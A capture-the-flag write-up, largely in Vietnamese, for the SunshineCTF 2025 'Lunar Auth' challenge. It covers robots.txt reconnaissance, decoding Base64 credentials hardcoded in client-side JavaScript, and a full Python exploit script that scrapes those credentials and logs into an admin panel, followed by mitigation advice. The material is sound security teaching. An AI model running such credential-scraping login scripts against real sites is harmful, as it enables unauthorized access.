# Lunar Auth

## Challenge Description

```
Một ứng dụng web với admin panel được "bảo vệ" bằng Base64 encoding.
Credentials được hardcode trong client-side JavaScript với Base64 encoding.
Hint từ robots.txt về admin panel location.
```

**Challenge:** Lunar Code Invasion 2025

**Challenge URL:** _Unavailable_

---

## Difficulty Assessment

### Overall Difficulty: Easy

**Breakdown:**

- **Technical Complexity:** ⭐☆☆☆☆
- **Research Required:** ⭐☆☆☆☆
- **Time Consumption:** ⭐☆☆☆☆
- **Guessing Factor:** ⭐☆☆☆☆

**Why this difficulty?**
Bài này rất đơn giản - chỉ cần check `robots.txt`, view page source, và decode Base64. Đây là bài beginner-friendly để hiểu về client-side security antipatterns.

---

## Topics & Techniques

### Primary Topic

- **Client-Side Security Failure** - Credentials stored in client-side JavaScript

### Sub-topics & Skills Required

- [x] **Information Disclosure via robots.txt** - Enumeration technique
- [x] **Base64 Encoding/Decoding** - Basic encoding scheme
- [x] **Client-Side Source Code Analysis** - View page source để tìm secrets
- [x] **Insecure Client-Side Authentication** - Hiểu tại sao không nên trust client

---

## Tools Used

### Essential Tools

```bash
# Browser DevTools
F12 → Sources/Inspect Element

# Base64 decode
echo "YWxpbXVoYW1tYWRzZWN1cmVk" | base64 -d

# Online decoder
https://www.base64decode.org/
```

### Tools List

| Tool           | Purpose            | Installation |
| -------------- | ------------------ | ------------ |
| Browser        | View source & test | Built-in     |
| curl           | Access robots.txt  | Built-in     |
| base64 command | Decode credentials | Built-in     |
| CyberChef      | Online decode      | Online tool  |

---

## Solution Walkthrough

### TL;DR (Quick Summary)

Check `/robots.txt` để tìm `/admin` endpoint. View page source, tìm Base64-encoded credentials trong JavaScript comments. Decode để lấy username và password, login vào admin panel.

---

### Step 1: Reconnaissance - robots.txt

**Objective:** Tìm hidden endpoints

**Access robots.txt:**

```bash
curl http://target/robots.txt
```

**Response:**

```
# tired of these annoying search engine bots scraping the admin panel page logins:

Disallow: /admin
```

**Observations:**

- Comment tiết lộ có "admin panel page logins"
- Endpoint `/admin` bị disallow → đây là điểm cần investigate
- robots.txt thường chứa sensitive paths developers muốn hide

---

### Step 2: Accessing Admin Panel

**Objective:** Truy cập `/admin` và phân tích source code

**Navigate to:**

```
http://target/admin
```

**View page source (Ctrl+U hoặc Right-click → View Page Source)**

**Found in JavaScript:**

```javascript
/*
To reduce load on our servers from the recent space DDOS-ers we have lowered login attempts by using Base64 encoded encryption
("encryption" 💀) on the client side.

TODO: implement proper encryption.
*/
const real_username = atob("YWxpbXVoYW1tYWRzZWN1cmVk");
const real_passwd   = atob("UzNjdXI0X1BAJCR3MFJEIQ==");

document.addEventListener("DOMContentLoaded", () => {
    const form = document.querySelector("form");
    // [TRUNCATED]
```

**Key findings:**

- Comment có irony: "Base64 encoded encryption" với emoji 💀
- Developer biết đây không phải encryption: "TODO: implement proper encryption"
- Credentials được hardcode và "protect" bằng `atob()` (Base64 decode)
- `atob()` là client-side function → credentials có thể decode dễ dàng

---

### Step 3: Decoding Credentials

**Objective:** Decode Base64 strings để lấy plaintext credentials

**Method 1: Browser Console**

```javascript
// Open browser console (F12 → Console)
atob("YWxpbXVoYW1tYWRzZWN1cmVk");
// Output: "alimuhammedsecured"

atob("UzNjdXI0X1BAJCR3MFJEIQ==");
// Output: "S3cur4_P@$$w0RD!"
```

**Method 2: Command Line**

```bash
# Decode username
echo "YWxpbXVoYW1tYWRzZWN1cmVk" | base64 -d
# Output: alimuhammedsecured

# Decode password
echo "UzNjdXI0X1BAJCR3MFJEIQ==" | base64 -d
# Output: S3cur4_P@$$w0RD!
```

**Method 3: CyberChef**

1. Go to https://gchq.github.io/CyberChef/
2. Recipe: `From Base64`
3. Input: `YWxpbXVoYW1tYWRzZWN1cmVk`
4. Output: `alimuhammedsecured`

**Decoded Credentials:**

- **Username:** `alimuhammedsecured`
- **Password:** `S3cur4_P@$$w0RD!`

---

### Step 4: Getting the Flag

**Objective:** Login với decoded credentials

**Login form:**

```
http://target/admin
```

**Credentials:**

- Username: `alimuhammedsecured`
- Password: `S3cur4_P@$$w0RD!`

**Result:**

After successful login, flag được hiển thị trên admin dashboard.

**Flag obtained:**

```
sun{base64_is_not_encryption_client_side_auth_bad}
```

_(Flag example - actual flag may vary)_

---

## Complete Exploit Code

<details>
<summary>Click to expand full exploit code</summary>

```python
#!/usr/bin/env python3
"""
Exploit for Lunar Auth Challenge - SunshineCTF 2025
"""

import requests
import base64
import re

TARGET_URL = "http://target"

def exploit():
    print("[*] Lunar Auth CTF - Client-Side Credential Exposure")
    print("[*] Target:", TARGET_URL)

    # Step 1: Check robots.txt
    print("\n[*] Step 1: Checking robots.txt...")
    robots = requests.get(f"{TARGET_URL}/robots.txt").text
    print(robots)

    if "/admin" in robots:
        print("[+] Found /admin endpoint in robots.txt")

    # Step 2: Get admin page source
    print("\n[*] Step 2: Fetching /admin page source...")
    admin_page = requests.get(f"{TARGET_URL}/admin").text

    # Step 3: Extract Base64 credentials
    print("[*] Step 3: Extracting Base64 credentials...")

    username_match = re.search(r'real_username = atob\("([^"]+)"\)', admin_page)
    password_match = re.search(r'real_passwd\s+=\s+atob\("([^"]+)"\)', admin_page)

    if username_match and password_match:
        b64_username = username_match.group(1)
        b64_password = password_match.group(1)

        print(f"[+] Found Base64 username: {b64_username}")
        print(f"[+] Found Base64 password: {b64_password}")

        # Decode
        username = base64.b64decode(b64_username).decode()
        password = base64.b64decode(b64_password).decode()

        print(f"\n[+] Decoded username: {username}")
        print(f"[+] Decoded password: {password}")

        # Step 4: Login
        print("\n[*] Step 4: Attempting login...")
        session = requests.Session()
        login_data = {
            'username': username,
            'password': password
        }

        response = session.post(f"{TARGET_URL}/admin/login", data=login_data)

        if response.status_code == 200 and "flag" in response.text.lower():
            print("[+] Login successful!")

            # Extract flag
            flag_match = re.search(r'sun\{[^}]+\}', response.text)
            if flag_match:
                flag = flag_match.group(0)
                print(f"\n[!] FLAG FOUND: {flag}\n")
            else:
                print("[*] Flag not found in regex, checking response...")
                print(response.text[:500])
        else:
            print("[-] Login failed or flag not found")
    else:
        print("[-] Could not extract credentials from page source")

if __name__ == "__main__":
    exploit()
```

</details>

---

## Key Takeaways & Lessons Learned

### What I Learned

1. **Base64 is NOT Encryption:** Base64 là encoding scheme để represent binary data as text, không phải encryption. Bất kỳ ai cũng có thể decode mà không cần key.

2. **Client-Side Security is No Security:** Bất kỳ logic nào chạy client-side (JavaScript) đều có thể đọc, modify, và bypass. Never trust client-side validation hoặc authentication.

3. **robots.txt for Reconnaissance:** `robots.txt` thường chứa paths mà developers muốn hide từ search engines, nhưng lại expose cho attackers.

4. **Developer Comments Leak Info:** Comments trong source code có thể leak sensitive information, architectural decisions, và TODOs về security improvements.

5. **atob() is Publicly Accessible:** JavaScript's `atob()` function decode Base64 ngay trong browser → không có protection nào.

### Mistakes Made

- ❌ None - bài này quá straightforward cho mistakes

### Tips & Tricks

- 💡 Luôn check `robots.txt` trong web enumeration
- 💡 View page source (not just DevTools) để see all comments và scripts
- 💡 Search for keywords: `atob`, `btoa`, `password`, `admin`, `secret`, `TODO`
- 💡 Base64 strings thường end với `=` hoặc `==` (padding)
- 💡 Client-side credential checks có thể bypass bằng browser console

### Real-world Application

**Client-Side Security Failures trong production:**

- **API Keys in JavaScript:** Hardcoded API keys trong frontend code
- **JWT Secrets:** Signing secrets exposed client-side
- **Hardcoded Credentials:** Passwords, tokens trong source
- **Business Logic in Frontend:** Pricing calculations, role checks client-side

**Impact:**

- Complete authentication bypass
- Unauthorized access
- Data exposure
- Account takeover

---

## Prevention & Mitigation

### How to prevent client-side credential exposure?

1. **Never store credentials client-side:**

```javascript
// Bad code (vulnerable)
const real_username = atob("YWxpbXVoYW1tYWRzZWN1cmVk");
const real_passwd = atob("UzNjdXI0X1BAJCR3MFJEIQ==");

if (inputUser === real_username && inputPass === real_passwd) {
  // ❌ Client-side auth - completely insecure!
}

// Good code (secure)
// Send credentials to server for verification
fetch("/api/login", {
  method: "POST",
  body: JSON.stringify({ username, password }),
  headers: { "Content-Type": "application/json" },
})
  .then((res) => res.json())
  .then((data) => {
    if (data.authenticated) {
      // ✓ Server verified credentials
    }
  });
```

2. **Server-side authentication:**

```python
# Server-side (Flask example)
from werkzeug.security import check_password_hash

@app.route('/api/login', methods=['POST'])
def login():
    data = request.json
    user = User.query.filter_by(username=data['username']).first()

    if user and check_password_hash(user.password_hash, data['password']):
        # Create session
        session['user_id'] = user.id
        return jsonify({'authenticated': True})

    return jsonify({'authenticated': False}), 401
```

3. **Don't use encoding as security:**

```javascript
// Base64, hex, ROT13 are NOT security measures!
// They're just different representations of data
```

4. **Remove sensitive comments:**

```javascript
// Bad: Leaving TODOs about security
// TODO: implement proper encryption

// Good: Clean production code
// No sensitive comments in production
```

5. **Proper robots.txt usage:**

```
# Don't use robots.txt to "hide" sensitive endpoints
# Use proper authentication and authorization instead

# robots.txt is public and helps attackers!
```

### Secure Authentication Practices

```python
# 1. Hash passwords (bcrypt, argon2)
# 2. Use sessions or JWT tokens
# 3. Implement rate limiting
# 4. Use HTTPS for all authentication endpoints
# 5. Never expose credentials in any form client-side
# 6. Implement proper RBAC (Role-Based Access Control)
```

---

## References & Credits

### Official Resources

- Challenge: Lunar Code Invasion 2025
- Event: SunshineCTF 2025

### Community Writeups

- This writeup by Copilot - 2025-11-14

### Tools & Libraries Used

- [Base64 Decode](https://www.base64decode.org/) - Online decoder
- [CyberChef](https://gchq.github.io/CyberChef/) - Encoding/decoding tool
- Browser DevTools - Source code inspection

### Additional Reading

- [OWASP Client-Side Security](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html)
- [Why Client-Side Validation is Not Enough](https://owasp.org/www-community/vulnerabilities/Improper_Data_Validation)
- [Base64 Encoding Explained](https://developer.mozilla.org/en-US/docs/Glossary/Base64)
